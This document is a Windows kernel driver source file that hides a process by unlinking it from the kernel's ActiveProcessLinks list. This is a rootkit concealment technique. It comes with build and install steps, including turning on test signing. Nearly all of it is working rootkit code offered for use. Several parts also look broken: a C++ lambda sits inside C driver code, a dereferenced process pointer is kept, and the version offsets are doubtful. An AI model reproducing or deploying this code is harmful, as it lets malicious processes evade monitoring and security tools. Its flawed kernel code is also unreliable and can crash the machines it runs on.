/*
 * DKOM Process Hiding Driver
 * 
 * This driver hides a process from the system by unlinking it from
 * the ActiveProcessLinks doubly-linked list in the EPROCESS structure.
 * 
 * BUILD REQUIREMENTS:
 * - Windows Driver Kit (WDK) 10 or later
 * - Visual Studio with Windows Driver extension
 * - Test signing mode enabled (bcdedit /set testsigning on)
 * 
 * BUILD INSTRUCTIONS:
 * 1. Open "x64 Native Tools Command Prompt for VS"
 * 2. Navigate to this directory
 * 3. Run: msbuild hideproc.vcxproj /p:Configuration=Release /p:Platform=x64
 * 
 * INSTALLATION:
 * 1. Enable test signing: bcdedit /set testsigning on (reboot required)
 * 2. Install driver: sc create HideProc binPath= <path>\hideproc.sys type= kernel
 * 3. Start driver: sc start HideProc
 * 
 * WARNING: This driver operates at kernel level. Bugs can cause BSOD.
 */

#include <ntddk.h>

// Undocumented structures
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// Process information passed from user mode
typedef struct _HIDE_PROC_INFO {
    ULONG ProcessId;
    BOOLEAN Hidden;
} HIDE_PROC_INFO, *PHIDE_PROC_INFO;

// Device name and symbolic link
#define DEVICE_NAME L"\\Device\\HideProc"
#define SYMBOLIC_LINK L"\\DosDevices\\HideProc"
#define IOCTL_HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Global variables
static PDEVICE_OBJECT g_DeviceObject = NULL;
static LIST_ENTRY g_OriginalLinks;
static BOOLEAN g_IsHidden = FALSE;
static PEPROCESS g_TargetProcess = NULL;

// Get EPROCESS.ActiveProcessLinks offset (varies by Windows version)
static ULONG GetActiveProcessLinksOffset() {
    RTL_OSVERSIONINFOW osVersion;
    osVersion.dwOSVersionInfoSize = sizeof(osVersion);
    RtlGetVersion(&osVersion);

    // Offsets for common Windows versions (x64)
    if (osVersion.dwMajorVersion == 10) {
        if (osVersion.dwBuildNumber >= 22000) return 0x448;  // Win11 22H2+
        if (osVersion.dwBuildNumber >= 19041) return 0x448;  // Win10 20H1+
        return 0x2f0;  // Win10 older
    }
    if (osVersion.dwMajorVersion == 6) {
        if (osVersion.dwMinorVersion >= 2) return 0x2e8;  // Win8+
        return 0x188;  // Win7
    }
    return 0x2f0;  // Default
}

// Get EPROCESS.UniqueProcessId offset
static ULONG GetUniqueProcessIdOffset() {
    RTL_OSVERSIONINFOW osVersion;
    osVersion.dwOSVersionInfoSize = sizeof(osVersion);
    RtlGetVersion(&osVersion);

    if (osVersion.dwMajorVersion >= 6) return 0x2e0;  // Vista+
    return 0x84;  // XP
}

// Hide process by unlinking from ActiveProcessLinks
static NTSTATUS HideProcess(ULONG pid) {
    PEPROCESS process;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &process);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[HideProc] Failed to find process %lu\n", pid);
        return status;
    }

    ULONG aplOffset = GetActiveProcessLinksOffset();
    PLIST_ENTRY apl = (PLIST_ENTRY)((PUCHAR)process + aplOffset);

    // Save original links for restoration
    g_OriginalLinks = *apl;
    g_TargetProcess = process;

    // Unlink from the list
    PLIST_ENTRY prev = apl->Blink;
    PLIST_ENTRY next = apl->Flink;

    prev->Flink = next;
    next->Blink = prev;

    // Point to itself (safe sentinel)
    apl->Flink = apl;
    apl->Blink = apl;

    g_IsHidden = TRUE;
    ObDereferenceObject(process);

    DbgPrint("[HideProc] Process %lu hidden successfully\n", pid);
    return STATUS_SUCCESS;
}

// Restore process visibility
static NTSTATUS RestoreProcess() {
    if (!g_IsHidden || !g_TargetProcess) {
        return STATUS_UNSUCCESSFUL;
    }

    PLIST_ENTRY apl = (PLIST_ENTRY)((PUCHAR)g_TargetProcess + GetActiveProcessLinksOffset());

    // Restore original links
    *apl = g_OriginalLinks;

    // Re-link into the list
    PLIST_ENTRY prev = apl->Blink;
    PLIST_ENTRY next = apl->Flink;

    prev->Flink = apl;
    next->Blink = apl;

    g_IsHidden = FALSE;
    g_TargetProcess = NULL;

    DbgPrint("[HideProc] Process restored\n");
    return STATUS_SUCCESS;
}

// IRP Dispatch routines
static NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bytesReturned = 0;

    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_HIDE_PROC:
        if (stack->Parameters.DeviceIoControl.InputBufferLength >= sizeof(HIDE_PROC_INFO)) {
            PHIDE_PROC_INFO info = (PHIDE_PROC_INFO)Irp->AssociatedIrp.SystemBuffer;

            if (info->Hidden) {
                status = HideProcess(info->ProcessId);
            } else {
                status = RestoreProcess();
            }
        } else {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

// Driver entry point
static NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrint("[HideProc] Driver loading...\n");

    UNICODE_STRING deviceName, symbolicLink;
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symbolicLink, SYMBOLIC_LINK);

    // Create device
    NTSTATUS status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &g_DeviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[HideProc] Failed to create device: 0x%X\n", status);
        return status;
    }

    // Create symbolic link
    status = IoCreateSymbolicLink(&symbolicLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(g_DeviceObject);
        return status;
    }

    // Set up dispatch routines
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    DriverObject->DriverUnload = [](PDRIVER_OBJECT DriverObject) {
        UNICODE_STRING symbolicLink;
        RtlInitUnicodeString(&symbolicLink, SYMBOLIC_LINK);
        IoDeleteSymbolicLink(&symbolicLink);
        if (g_DeviceObject) IoDeleteDevice(g_DeviceObject);

        if (g_IsHidden) RestoreProcess();

        DbgPrint("[HideProc] Driver unloaded\n");
    };

    g_DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[HideProc] Driver loaded successfully\n");
    return STATUS_SUCCESS;
}
